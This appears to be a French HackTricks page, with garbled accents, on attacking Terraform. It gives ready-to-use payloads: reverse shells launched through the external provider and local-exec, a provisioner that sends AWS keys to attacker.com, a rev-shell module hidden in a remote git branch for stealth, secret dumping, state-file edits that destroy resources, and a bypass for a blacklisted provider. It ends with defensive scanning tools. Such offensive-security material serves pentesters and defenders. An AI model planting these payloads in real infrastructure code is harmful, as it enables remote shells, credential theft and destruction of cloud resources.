# S√©curit√© Terraform

{{#include ../banners/hacktricks-training.md}}

## Informations de base

[Des docs :](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform est un **outil d'infrastructure en tant que code** qui vous permet de d√©finir √† la fois des **ressources cloud et sur site** dans des fichiers de configuration lisibles par l'homme que vous pouvez versionner, r√©utiliser et partager. Vous pouvez ensuite utiliser un flux de travail coh√©rent pour provisionner et g√©rer toute votre infrastructure tout au long de son cycle de vie. Terraform peut g√©rer des composants de bas niveau comme le calcul, le stockage et les ressources r√©seau, ainsi que des composants de haut niveau comme les entr√©es DNS et les fonctionnalit√©s SaaS.

#### Comment fonctionne Terraform ?

Terraform cr√©e et g√®re des ressources sur des plateformes cloud et d'autres services via leurs interfaces de programmation d'applications (API). Les fournisseurs permettent √† Terraform de fonctionner avec pratiquement n'importe quelle plateforme ou service disposant d'une API accessible.

![](<../images/image (177).png>)

HashiCorp et la communaut√© Terraform ont d√©j√† √©crit **plus de 1700 fournisseurs** pour g√©rer des milliers de types de ressources et de services diff√©rents, et ce nombre continue de cro√Ætre. Vous pouvez trouver tous les fournisseurs disponibles publiquement sur le [Terraform Registry](https://registry.terraform.io/), y compris Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, et bien d'autres.

Le flux de travail principal de Terraform se compose de trois √©tapes :

- **√âcrire :** Vous d√©finissez des ressources, qui peuvent √™tre r√©parties sur plusieurs fournisseurs et services cloud. Par exemple, vous pourriez cr√©er une configuration pour d√©ployer une application sur des machines virtuelles dans un r√©seau de Cloud Priv√© Virtuel (VPC) avec des groupes de s√©curit√© et un √©quilibreur de charge.
- **Planifier :** Terraform cr√©e un plan d'ex√©cution d√©crivant l'infrastructure qu'il va cr√©er, mettre √† jour ou d√©truire en fonction de l'infrastructure existante et de votre configuration.
- **Appliquer :** Sur approbation, Terraform effectue les op√©rations propos√©es dans le bon ordre, en respectant les d√©pendances des ressources. Par exemple, si vous mettez √† jour les propri√©t√©s d'un VPC et changez le nombre de machines virtuelles dans ce VPC, Terraform recr√©era le VPC avant de mettre √† l'√©chelle les machines virtuelles.

![](<../images/image (215).png>)

### Laboratoire Terraform

Il vous suffit d'installer terraform sur votre ordinateur.

Voici un [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) et ici vous avez la [meilleure fa√ßon de t√©l√©charger terraform](https://www.terraform.io/downloads).

## RCE dans Terraform

Terraform **n'a pas de plateforme exposant une page web ou un service r√©seau** que nous pouvons √©num√©rer, donc, la seule fa√ßon de compromettre terraform est de **pouvoir ajouter/modifier des fichiers de configuration terraform**.

Cependant, terraform est un **composant tr√®s sensible** √† compromettre car il aura **un acc√®s privil√©gi√©** √† diff√©rents emplacements afin de fonctionner correctement.

La principale fa√ßon pour un attaquant de pouvoir compromettre le syst√®me o√π terraform fonctionne est de **compromettre le d√©p√¥t qui stocke les configurations terraform**, car √† un moment donn√©, elles vont √™tre **interpr√©t√©es**.

En fait, il existe des solutions qui **ex√©cutent automatiquement terraform plan/apply apr√®s qu'une PR** soit cr√©√©e, comme **Atlantis** :

{{#ref}}
atlantis-security.md
{{#endref}}

Si vous √™tes capable de compromettre un fichier terraform, il existe diff√©rentes fa√ßons de r√©aliser un RCE lorsque quelqu'un ex√©cute `terraform plan` ou `terraform apply`.

### Terraform plan

Terraform plan est la **commande la plus utilis√©e** dans terraform et les d√©veloppeurs/solutions utilisant terraform l'appellent tout le temps, donc la **fa√ßon la plus simple d'obtenir un RCE** est de s'assurer que vous empoisonnez un fichier de configuration terraform qui ex√©cutera des commandes arbitraires dans un `terraform plan`.

**Utilisation d'un fournisseur externe**

Terraform propose le [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) qui fournit un moyen d'interface entre Terraform et des programmes externes. Vous pouvez utiliser la source de donn√©es `external` pour ex√©cuter du code arbitraire pendant un `plan`.

Injecter dans un fichier de configuration terraform quelque chose comme ce qui suit ex√©cutera un shell invers√© lors de l'ex√©cution de `terraform plan` :
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Utilisation d'un fournisseur personnalis√©**

Un attaquant pourrait envoyer un [fournisseur personnalis√©](https://learn.hashicorp.com/tutorials/terraform/provider-setup) au [Terraform Registry](https://registry.terraform.io/) et ensuite l'ajouter au code Terraform dans une branche de fonctionnalit√© ([exemple ici](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Le fournisseur est t√©l√©charg√© dans l'`init` et ex√©cutera le code malveillant lorsque `plan` est ex√©cut√©.

Vous pouvez trouver un exemple dans [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Utilisation d'une r√©f√©rence externe**

Les deux options mentionn√©es sont utiles mais pas tr√®s discr√®tes (la seconde est plus discr√®te mais plus complexe que la premi√®re). Vous pouvez effectuer cette attaque m√™me de mani√®re **plus discr√®te**, en suivant ces suggestions :

- Au lieu d'ajouter le rev shell directement dans le fichier terraform, vous pouvez **charger une ressource externe** qui contient le rev shell :
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le code rev shell dans [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- Dans la ressource externe, utilisez la fonctionnalit√© **ref** pour cacher le **code rev shell terraform dans une branche** √† l'int√©rieur du d√©p√¥t, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply sera ex√©cut√© pour appliquer tous les changements, vous pouvez √©galement en abuser pour obtenir RCE en injectant **un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Vous devez juste vous assurer qu'une charge utile comme les suivantes se termine dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour effectuer cette attaque de mani√®re **plus discr√®te en utilisant des r√©f√©rences externes**.

## Secrets Dumps

Vous pouvez avoir **des valeurs secr√®tes utilis√©es par terraform extraites** en ex√©cutant `terraform apply` en ajoutant au fichier terraform quelque chose comme :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abus des fichiers d'√©tat Terraform

Dans le cas o√π vous avez un acc√®s en √©criture sur les fichiers d'√©tat terraform mais ne pouvez pas modifier le code terraform, [**cette recherche**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) propose des options int√©ressantes pour tirer parti du fichier :

### Suppression de ressources <a href="#deleting-resources" id="deleting-resources"></a>

Il existe 2 fa√ßons de d√©truire des ressources :

1. **Ins√©rer une ressource avec un nom al√©atoire dans le fichier d'√©tat pointant vers la vraie ressource √† d√©truire**

Parce que terraform verra que la ressource ne devrait pas exister, il la d√©truira (suivant l'ID de la vraie ressource indiqu√©). Exemple de la page pr√©c√©dente :
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modifier la ressource √† supprimer de mani√®re √† ce qu'il ne soit pas possible de mettre √† jour (afin qu'elle soit supprim√©e et recr√©√©e)**

Pour une instance EC2, modifier le type de l'instance suffit √† faire en sorte que terraform la supprime et la recr√©e.

### RCE

Il est √©galement possible de [cr√©er un fournisseur personnalis√©](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) et de remplacer simplement l'un des fournisseurs dans le fichier d'√©tat terraform par le malveillant ou d'ajouter une ressource vide avec le fournisseur malveillant. Exemple de la recherche originale :
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Remplacer le fournisseur sur liste noire

Dans le cas o√π vous rencontrez une situation o√π `hashicorp/external` a √©t√© mis sur liste noire, vous pouvez r√©impl√©menter le fournisseur `external` en proc√©dant comme suit. Remarque : Nous utilisons un fork du fournisseur externe publi√© par https://registry.terraform.io/providers/nazarewk/external/latest. Vous pouvez √©galement publier votre propre fork ou r√©impl√©mentation.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ensuite, vous pouvez utiliser `external` comme d'habitude.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Outils d'Audit Automatiques

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk propose une solution compl√®te de scan Infrastructure as Code (IaC) qui d√©tecte les vuln√©rabilit√©s et les erreurs de configuration dans Terraform, CloudFormation, Kubernetes et d'autres formats IaC.

- **Fonctionnalit√©s :**
- Scan en temps r√©el pour les vuln√©rabilit√©s de s√©curit√© et les probl√®mes de conformit√©.
- Int√©gration avec les syst√®mes de contr√¥le de version (GitHub, GitLab, Bitbucket).
- Demandes de tirage de correction automatis√©es.
- Conseils d√©taill√©s pour la rem√©diation.
- **Inscription :** Cr√©ez un compte sur [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** est un outil d'analyse de code statique pour l'infrastructure en tant que code (IaC) et √©galement un outil d'analyse de composition logicielle (SCA) pour les images et les packages open source.

Il analyse l'infrastructure cloud provisionn√©e √† l'aide de [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), ou [OpenTofu](https://opentofu.org/) et d√©tecte les erreurs de configuration de s√©curit√© et de conformit√© √† l'aide d'une analyse bas√©e sur des graphes.

Il effectue une [analyse de composition logicielle (SCA)](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) qui est une analyse des packages open source et des images pour les vuln√©rabilit√©s et expositions communes (CVE).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

D'apr√®s les [**docs**](https://github.com/terraform-compliance/cli) : `terraform-compliance` est un cadre de test l√©ger, ax√© sur la s√©curit√© et la conformit√©, contre terraform pour permettre la capacit√© de test n√©gatif pour votre infrastructure-as-code.

- **conformit√© :** Assurez-vous que le code impl√©ment√© respecte les normes de s√©curit√©, vos propres normes personnalis√©es
- **d√©veloppement dirig√© par le comportement :** Nous avons BDD pour presque tout, pourquoi pas pour IaC ?
- **portable :** installez-le simplement via `pip` ou ex√©cutez-le via `docker`. Voir [Installation](https://terraform-compliance.com/pages/installation/)
- **pr√©-d√©ploiement :** il valide votre code avant qu'il ne soit d√©ploy√©
- **facile √† int√©grer :** il peut s'ex√©cuter dans votre pipeline (ou dans des hooks git) pour garantir que tous les d√©ploiements sont valid√©s.
- **s√©paration des t√¢ches :** vous pouvez garder vos tests dans un d√©p√¥t diff√©rent o√π une √©quipe distincte est responsable.

> [!NOTE]
> Malheureusement, si le code utilise certains fournisseurs auxquels vous n'avez pas acc√®s, vous ne pourrez pas effectuer le `terraform plan` et ex√©cuter cet outil.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

D'apr√®s les [**docs**](https://github.com/aquasecurity/tfsec) : tfsec utilise l'analyse statique de votre code terraform pour rep√©rer les configurations incorrectes potentielles.

- ‚òÅÔ∏è V√©rifie les configurations incorrectes sur tous les principaux (et certains mineurs) fournisseurs de cloud
- ‚õî Des centaines de r√®gles int√©gr√©es
- ü™Ü Scanne les modules (locaux et distants)
- ‚ûï √âvalue les expressions HCL ainsi que les valeurs litt√©rales
- ‚Ü™Ô∏è √âvalue les fonctions Terraform par exemple `concat()`
- üîó √âvalue les relations entre les ressources Terraform
- üß∞ Compatible avec le Terraform CDK
- üôÖ Applique (et embellit) les politiques Rego d√©finies par l'utilisateur
- üìÉ Prend en charge plusieurs formats de sortie : lovely (par d√©faut), JSON, SARIF, CSV, CheckStyle, JUnit, texte, Gif.
- üõ†Ô∏è Configurable (via des drapeaux CLI et/ou un fichier de configuration)
- ‚ö° Tr√®s rapide, capable de scanner rapidement d'√©normes d√©p√¥ts
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Trouvez des vuln√©rabilit√©s de s√©curit√©, des probl√®mes de conformit√© et des erreurs de configuration d'infrastructure t√¥t dans le cycle de d√©veloppement de votre infrastructure-as-code avec **KICS** de Checkmarx.

**KICS** signifie **K**eeping **I**nfrastructure as **C**ode **S**ecure, il est open source et est indispensable pour tout projet cloud natif.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

D'apr√®s les [**docs**](https://github.com/tenable/terrascan) : Terrascan est un analyseur de code statique pour l'Infrastructure as Code. Terrascan vous permet de :

- Scanner sans effort l'infrastructure en tant que code pour des erreurs de configuration.
- Surveiller l'infrastructure cloud provisionn√©e pour des changements de configuration qui introduisent une d√©rive de posture, et permet de revenir √† une posture s√©curis√©e.
- D√©tecter des vuln√©rabilit√©s de s√©curit√© et des violations de conformit√©.
- Att√©nuer les risques avant de provisionner une infrastructure cloud native.
- Offrir la flexibilit√© de fonctionner localement ou de s'int√©grer √† votre CI\CD.
```bash
brew install terrascan
```
## R√©f√©rences

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{{#include ../banners/hacktricks-training.md}}
